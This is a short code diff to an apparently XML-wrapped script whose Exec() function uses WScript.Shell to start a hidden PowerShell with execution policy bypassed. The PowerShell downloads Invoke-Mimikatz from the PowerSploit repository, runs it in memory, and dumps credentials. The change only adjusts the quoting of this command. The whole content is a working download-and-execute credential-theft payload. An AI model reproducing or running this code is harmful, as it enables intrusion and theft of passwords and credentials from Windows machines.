@@ -19,7 +19,7 @@
 
 	function Exec()
 	{
-		var r = new ActiveXObject("WScript.Shell").Run("cmd /K powershell.exe -windowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds");
+		var r = new ActiveXObject("WScript.Shell").Run("cmd /K "powershell.exe -windowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"");
 	}
 
 ]]>
